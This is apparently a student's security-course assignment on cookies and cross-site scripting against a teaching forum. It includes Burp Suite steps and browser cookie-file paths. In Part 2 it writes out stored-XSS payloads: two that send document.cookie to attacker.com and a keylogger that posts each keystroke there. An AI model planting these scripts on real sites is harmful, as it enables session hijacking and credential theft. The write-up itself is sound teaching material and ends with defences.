# Cookies and Cross-Site Scripting (XSS)

**Name**: Palmy Klangsathorn

This assignment explores cookies and Cross-Site Scripting (XSS) in the [Fake Discussion Forum (FDF)](http://cs338.jeffondich.com/fdf/).

---

## Part 1: Cookies

### a. Inspecting Cookies

**Question:** Go to FDF and use your browser's Inspector to take a look at your cookies for cs338.jeffondich.com. Are there cookies for that domain? What are their names and values?  
**Answer:** Yes, there are cookies. The name is 'theme', and the value is 'default'.

| Name  | Value   | Domain               | Path | Expires/Max-Age          | Size | HttpOnly | Secure | SameSite | Partition Key Site | Cross Site | Priority |
| ----- | ------- | -------------------- | ---- | ------------------------ | ---- | -------- | ------ | -------- | ------------------ | ---------- | -------- |
| theme | default | cs338.jeffondich.com | /    | 2025-01-24T20:37:14.182Z | 12   |          |        |          |                    |            | Medium   |

### b. Changing the Theme and Cookie Observation

**Question:** Using the "Theme" menu on the FDF page, change your theme to red or blue. Look at your cookies for cs338.jeffondich.com again. Did they change?  
**Answer:** The value changes to 'red', and the size changes to '8'; the default size is '12'.

| Name  | Value | Domain               | Path | Expires/Max-Age          | Size | HttpOnly | Secure | SameSite | Partition Key Site | Cross Site | Priority |
| ----- | ----- | -------------------- | ---- | ------------------------ | ---- | -------- | ------ | -------- | ------------------ | ---------- | -------- |
| theme | red   | cs338.jeffondich.com | /    | 2025-01-24T20:37:14.182Z | 8    |          |        |          |                    |            | Medium   |

### c. Using Burpsuite to Observe Cookies

**Question:** Do the previous two steps (examining cookies and changing the theme) using Burpsuite. What "Cookie:" and "Set-Cookie:" HTTP headers do you see? Do you see the same cookie values as you did with the Inspector?  
**Answer:** Initially, the Cookies header shows: `"theme = default"` with the request `GET /fdf/ HTTP/1.1`. In the response `HTTP/1.1 200 OK`, the "Set-Cookie" header shows: `theme=default; Expires=Sat, 25 Jun 2025 00:41:28 GMT; Path=/`. Then, after changing the theme to red, the Cookies header updates to: `"theme = red"`, with the "Set-Cookie" header showing: `theme=red; Expires=Sat, 25 Jun 2025 01:03:08 GMT; Path=/`. Finally, after changing the theme to blue, I see: `"theme = blue"` and `Set-Cookie: theme=blue; Expires=Sat, 25 Jun 2025 01:03:07 GMT; Path=/`.

### d. Persistence of Theme Selection After Browser Restart

**Question:** Quit your browser, relaunch it, and go back to the FDF. Is your red or blue theme (wherever you last left it) still selected?
**Answer:** Yes, the last theme I chose, which is `"theme = blue"` is still selected.

### e. Theme Transmission between Browser and Server

**Question:** How is the current theme transmitted between the browser and the FDF server?
**Answer:** The current theme is transmitted as a cookie in the HTTP headers between the browser and the FDF server. When the theme is set or changed, a "Set-Cookie" header is sent from the server to the browser, and the browser includes this cookie in subsequent requests to the server, allowing it to remember the user's theme preference.

### f. Changing the Theme Transmission

**Question:** When you change the theme, how is the change transmitted between the browser and the FDF server?  
**Answer:** The theme change is transmitted via an HTTP request where the updated theme value is sent to the server. Upon selecting a new theme, the server sends back a "Set-Cookie" HTTP header with the updated theme value, setting it in the browser's cookies. This updated cookie is then included in subsequent requests to ensure the server recognizes the chosen theme.

### g. Changing Theme through Inspector

**Question:** How could you use your browser's Inspector to change the FDF theme without using the FDF's Theme menu?  
**Answer:** I can manually edit the cookie value through the Inspector. Open the browser’s Developer Tools, navigate to the “Application” or “Storage” tab, and locate the "theme" cookie under `cs338.jeffondich.com`. Change the value of this cookie to the desired theme (e.g., "red" or "blue"), and refresh the page to apply the new theme.

### h. Changing Theme through Burpsuite Proxy

**Question:** How could you use Burpsuite's Proxy tool to change the FDF theme without using the FDF's Theme menu?  
**Answer:** Using Burpsuite’s Proxy tool, I can intercept the HTTP request sent to the FDF server. When the request is paused in Burpsuite, modify the "Cookie" header to change the theme value (e.g., `theme=blue`). Forward the modified request, and the server will recognize the new theme setting based on the altered cookie value.

### i. OS Cookie Storage

**Question:** Where does your OS (the OS where you're running your browser and Burpsuite, that is) store cookies? (This will require some internet searching, most likely.)  
**Answer:** My computer is macOS, and Burp Suite is running on Kali Linux.

- On **macOS**:

  - **Chrome** stores cookies in `~/Library/Application Support/Google/Chrome/Default/Cookies`

- On **Linux** (Kali):
  - **Firefox** stores cookies in `~/.mozilla/firefox/[profile_name]/cookies.sqlite`.

## Cookies are typically stored in SQLite databases or similar formats, depending on the browser and setup.

## Part 2: Cross-Site Scripting (XSS)

### a. Provide a diagram and/or a step-by-step description of the nature and timing of Moriarty's attack on users of the FDF. Note that some of the relevant actions may happen long before other actions.

1. **Step 1:** Moriarty creates a post with embedded JavaScript in the post body.
2. **Step 2:** The JavaScript code is designed to execute when someone views Moriarty's post.
3. **Step 3:** When a user clicks on Moriarty’s post title, the JavaScript runs, manipulating the FDF page. This may include unexpected changes, like altering text color, displaying pop-ups, or more.
4. **Step 4:** The malicious JavaScript affects all users who view the post, creating a persistent, client-side effect on the FDF interface.

---

### b. Describe an XSS attack that is more virulent than Moriarty's "turn something red" and "pop up a message" attacks. Think about what kinds of things the Javascript might have access to via Alice's browser when Alice views the attacker's post.

/////I HAVEN'T TESTED IT YET BECAUSE THE FDF WAS DOWN UNINTENTIONALLY
The attacker might gather information about theme preference of each user to observe user settings across different users, then combine these data to gain insights about user behavior. In this case, the script could retrieve Alice's theme color cookie and send it to an external server controlled by the attacker, allowing the attacker to collect data about Alice's preferences on this website. This will get Alice's cookie info about the theme color! red or blue or default.

```html
<script>
  fetch("https://attacker.com/steal-theme", {
    method: "POST",
    body: `theme=${document.cookie}`,
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
    },
  });
</script>
```

Moreover, the script could retrieve Alice's authentication cookies (when there are more sensitive cookies) and send them to an external server controlled by the attacker. With these cookies, the attacker could impersonate Alice, gain access to her account, and post malicious content under her name.

/////I HAVEN'T TESTED IT YET BECAUSE THE FDF WAS DOWN UNINTENTIONALLY

```html
<script>
  fetch("https://attacker.com/steal-cookie", {
    method: "POST",
    body: document.cookie,
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
    },
  });
</script>
```

---

### c. Do it again: describe a second attack that is more virulent than Moriarty's, but that's substantially different from your first idea.

This JavaScript could capture sensitive information like usernames, passwords, and other personal information as users type. The data could then be sent to the attacker’s server, compromising the security of any user interacting with the page.

/////I HAVEN'T TESTED IT YET BECAUSE THE FDF WAS DOWN UNINTENTIONALLY

```html
<script>
  document.addEventListener("keypress", function (event) {
    fetch("https://attacker.com/keystrokes", {
      method: "POST",
      body: JSON.stringify({ key: event.key }),
      headers: {
        "Content-Type": "application/json",
      },
    });
  });
</script>
```

---

### d. What techniques can the server or the browser use to prevent what Moriarty is doing?

1. The server should sanitize all user input to prevent users from embedding executable scripts. This would include removing any `<script>` tags or attributes that can execute code, such as `onclick`, `onload`, or `style`.

2. Set cookies with the HttpOnly and SameSite flags to prevent JavaScript from accessing them directly and to reduce the risk of session hijacking.

---
